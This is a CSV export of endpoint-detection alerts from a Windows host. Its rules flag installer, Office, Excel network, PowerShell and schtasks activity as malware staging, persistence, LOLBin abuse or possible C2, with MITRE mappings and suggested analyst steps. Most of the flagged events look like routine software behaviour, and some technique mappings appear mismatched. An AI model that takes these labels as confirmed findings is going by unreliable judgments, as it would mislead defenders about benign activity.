"Jun 1, 2026 @ 14:21:45.813",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1040\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F087C657
"Jun 1, 2026 @ 14:21:45.059",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-4D6C1652
"Jun 1, 2026 @ 14:21:18.729",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msaccess.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msaccess.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-DE789664
"Jun 1, 2026 @ 14:21:18.666",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\excel.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-35E24B82
"Jun 1, 2026 @ 14:21:18.607",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\lync.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lync.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-6AAB2EF1
"Jun 1, 2026 @ 14:23:34.052",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,C:\Windows\explorer.exe,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\DELL\Desktop\Primus.xlsx""",Network Outlier | Rare Parent-Child,30,Rare process pair: explorer.exe->excel.exe ; High distinct destinations for excel.exe,,,,,,start,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C7BC6DAC
"Jun 1, 2026 @ 14:24:16.939",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,C:\Windows\explorer.exe,"""C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE"" ""C:\Users\DELL\Desktop\Primus.xlsx""",Network Outlier | Rare Parent-Child,30,Rare process pair: explorer.exe->excel.exe ; High distinct destinations for excel.exe,,,,,,end,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7CF90988
"Jun 1, 2026 @ 14:21:45.577",C:\Windows\System32\VSSVC.exe,C:\Windows\System32\services.exe,C:\Windows\system32\vssvc.exe,Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): vssvc.exe ; Rare process pair: services.exe->vssvc.exe,,,,,,start,"37,124",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-874B5103
"Jun 1, 2026 @ 14:22:59.709",C:\Windows\System32\SearchProtocolHost.exe,C:\Windows\System32\SearchIndexer.exe,"""C:\Windows\System32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): searchprotocolhost.exe ; Rare process pair: searchindexer.exe->searchprotocolhost.exe,,,,,,start,"21,916",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-2C6E772F
"Jun 1, 2026 @ 14:23:22.904",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\wt.exe,wt.exe ,Rare Parent-Child | Rare Process,30,Process seen only 1 time(s): windowsterminal.exe ; Rare process pair: wt.exe->windowsterminal.exe,,,,,,end,"26,548",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-A331C2F5
"Jun 1, 2026 @ 14:23:22.942",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\OpenConsole.exe,C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.24.11321.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" --headless --textMeasurement graphemes --width 120 --height 30 --signal 0x988 --server 0x8e8",Rare Parent-Child | Rare Process,30,Process seen only 1 time(s): openconsole.exe ; Rare process pair: windowsterminal.exe->openconsole.exe,,,,,,end,"11,672",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-6462126F
"Jun 1, 2026 @ 14:24:47.400",C:\Windows\System32\VSSVC.exe,C:\Windows\System32\services.exe,C:\Windows\system32\vssvc.exe,Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): vssvc.exe ; Rare process pair: services.exe->vssvc.exe,,,,,,end,"37,124",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-F3E6C428
"Jun 1, 2026 @ 14:23:36.326",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 103.243.115.105 ; High distinct destinations for excel.exe,173.10.254.170,103.243.115.105,,,,connection_attempted,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-4E02612E
"Jun 1, 2026 @ 14:23:36.373",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 103.243.115.105 ; High distinct destinations for excel.exe,173.10.254.170,103.243.115.105,,,,disconnect_received,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-98851EA4
"Jun 1, 2026 @ 14:23:39.859",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 52.111.225.4 ; High distinct destinations for excel.exe,173.10.254.170,52.111.225.4,,,,connection_attempted,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-0130A28A
"Jun 1, 2026 @ 14:23:49.225",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 40.74.98.192 ; High distinct destinations for excel.exe,173.10.254.170,40.74.98.192,,,,connection_attempted,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-D23A8070
"Jun 1, 2026 @ 14:23:50.408",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 52.109.0.35 ; High distinct destinations for excel.exe,173.10.254.170,52.109.0.35,,,,connection_attempted,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-2D01E0FB
"Jun 1, 2026 @ 14:24:03.054",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 52.108.9.12 ; High distinct destinations for excel.exe,173.10.254.170,52.108.9.12,,,,connection_attempted,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-C5996A5F
"Jun 1, 2026 @ 14:24:11.026",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 52.111.225.4 ; High distinct destinations for excel.exe,173.10.254.170,52.111.225.4,,,,disconnect_received,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-3F278F87
"Jun 1, 2026 @ 14:24:14.526",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,30,Outbound to external IP: 40.74.98.192 ; High distinct destinations for excel.exe,173.10.254.170,40.74.98.192,,,,disconnect_received,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Block destination IP at perimeter; review netflow,AH-B2D63A25
"Jun 1, 2026 @ 14:23:34.873",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-C4C05ED8
"Jun 1, 2026 @ 14:23:36.319",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,,ctldl.windowsupdate.com,lookup_requested,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B745163B
"Jun 1, 2026 @ 14:23:36.524",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\AT\r_74DB6FURNR2TGPBK\c_UQTM99RVCFM5TO97.bin,,overwrite,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1669FDA1
"Jun 1, 2026 @ 14:23:58.085",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\Desktop\~$Primus.xlsx,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-328C6276
"Jun 1, 2026 @ 14:23:58.225",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_AJGSBEDWCME3CJFJALDGA5C5FKB2FRFY.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B5E203C1
"Jun 1, 2026 @ 14:23:58.288",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E6F4AUCJHOF4HQFSALDZAKDXC7AGCBFN.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A2C90E6D
"Jun 1, 2026 @ 14:23:58.296",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_G2FRB5FCAYHBF5GEFIGLBEHKB3EWFIGS.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-B33061C4
"Jun 1, 2026 @ 14:23:58.305",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CYHWDCAFBMHOGGEFAHFREBBBBYBFDRBY.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-350F49BF
"Jun 1, 2026 @ 14:23:58.327",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EQEBEPHSAHE3GFB5F2HOFMA3GOBWFPAT.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-67F6449F
"Jun 1, 2026 @ 14:23:58.329",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ABFABWDDC6FFHUEPBREKDPHDFVHVD2D2.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-3FCAC396
"Jun 1, 2026 @ 14:23:58.337",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F5EKCQCMELGUHHB3ABHBABDYAUHXCQGV.R,,rename,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5C048B98
"Jun 1, 2026 @ 14:23:58.345",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E6B6G6HFFSEZB3G7G7H7D5HPG5AYAAAP.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8EB76E32
"Jun 1, 2026 @ 14:23:58.346",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_HTBGF6DFAIBJCNCTHGGOHBHJB2CGCMB4.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-5F833288
"Jun 1, 2026 @ 14:23:58.352",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EEBUCOBLDEFME4H2A3CNAUHIC7D2A5CB.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1D83341E
"Jun 1, 2026 @ 14:23:58.361",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_E2HRFFDTCOB5DPDFBZHXEJAFBTEGA5CK.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-A40BAE5C
"Jun 1, 2026 @ 14:23:58.367",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CJCECKDKGSH3D7B3F5CIA3GSCZEKHSBD.R,,rename,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6490836A
"Jun 1, 2026 @ 14:23:58.375",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_CCHXBEBWCUCTATD3DXD3E7D5HRCUCBDM.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7ECE5130
"Jun 1, 2026 @ 14:23:58.391",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_GIFWESDFAGALHPH5GFCABDDNEQHJA3FQ.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-71169846
"Jun 1, 2026 @ 14:23:58.399",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EBAMFACGHCAHFNBDG3BUA5FDFGGZC6FZ.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-31F55893
"Jun 1, 2026 @ 14:21:11.231",C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): lockapp.exe ; Rare process pair: svchost.exe->lockapp.exe,,,,,,end,"17,392",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-D5A0D068
"Jun 1, 2026 @ 14:21:20.831",C:\Windows\System32\SearchProtocolHost.exe,C:\Windows\System32\SearchIndexer.exe,"""C:\Windows\System32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe2_ Global\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): searchprotocolhost.exe ; Rare process pair: searchindexer.exe->searchprotocolhost.exe,,,,,,end,"14,832",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-6A3D4405
"Jun 1, 2026 @ 14:21:27.737",C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",Rare Parent-Child | Rare Process,30,Process seen only 2 time(s): lockapp.exe ; Rare process pair: svchost.exe->lockapp.exe,,,,,,end,"3,260",,,False,LOW,LOW,Needs Review,Monitor,Manual analyst review required,AH-CB67E4CC
"Jun 1, 2026 @ 14:24:00.435",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\data.json,,rename,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-FB697532
"Jun 1, 2026 @ 14:24:01.980",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EFHVFAHJGZAHASCRF2GHFXBECCFFCDFA.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-716A70AA
"Jun 1, 2026 @ 14:24:01.988",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FDHPF4DWAQHJFVEEHMB4HIBWFFF7ETDB.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-22EEDA4C
"Jun 1, 2026 @ 14:24:01.990",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_ENGTDHCUHWC6BVDGA6GHBNGYGKFGEEH7.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0011B26B
"Jun 1, 2026 @ 14:24:01.997",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_F2FNDEHMBCDBEPGJAWGLADBOB7BVD3A3.R,,rename,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-60804A55
"Jun 1, 2026 @ 14:24:02.014",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_BEDKGSDWDWHQFBCKAWHHCGBYCAFPAGBQ.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-304DF428
"Jun 1, 2026 @ 14:24:02.015",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_FGHNECHWDDFMCBHRCRADDTFRFZCXAVAO.R,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8E3548E9
"Jun 1, 2026 @ 14:24:02.100",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,,d.docs.live.net,lookup_requested,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-0C538043
"Jun 1, 2026 @ 14:24:02.206",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,,d.docs.live.net,lookup_requested,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-290B6BC7
"Jun 1, 2026 @ 14:24:14.377",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\Diagnostics\EXCEL\Primary1780304014852392500_C9880DC3-0C78-49B5-A3CF-253D3893D90D.log,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8EF974CB
"Jun 1, 2026 @ 14:24:14.378",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,30,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\Diagnostics\EXCEL\Additional\Additional1780304014893504000_C9880DC3-0C78-49B5-A3CF-253D3893D90D.log,,creation,"25,556",,,False,LOW,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-4E73DF0F
"Jun 1, 2026 @ 14:23:15.569",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-336B4CC6
"Jun 1, 2026 @ 14:23:15.588",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DF5A0F7C
"Jun 1, 2026 @ 14:23:15.592",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DD1CFE8E
"Jun 1, 2026 @ 14:23:15.593",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-094D037D
"Jun 1, 2026 @ 14:23:14.614",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-8773B748
"Jun 1, 2026 @ 14:23:14.604",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ys45w0hl.cig.psm1,,deletion,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B9518EDA
"Jun 1, 2026 @ 14:23:14.602",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_1xa2qrrg.20m.ps1,,deletion,"10,492",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CFBE7B11
"Jun 1, 2026 @ 14:21:56.712",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"10,064",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B72A7184
"Jun 1, 2026 @ 14:21:56.516",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"10,064",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FF1EC4D1
"Jun 1, 2026 @ 14:21:44.255",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\inprogressinstallinfo.ipi,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-5C099863
"Jun 1, 2026 @ 14:21:44.242",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\inprogressinstallinfo.ipi,,creation,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-709FBF50
"Jun 1, 2026 @ 14:21:44.234",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee47.rbs,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-34B4A761
"Jun 1, 2026 @ 14:23:15.605",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9BF45FC1
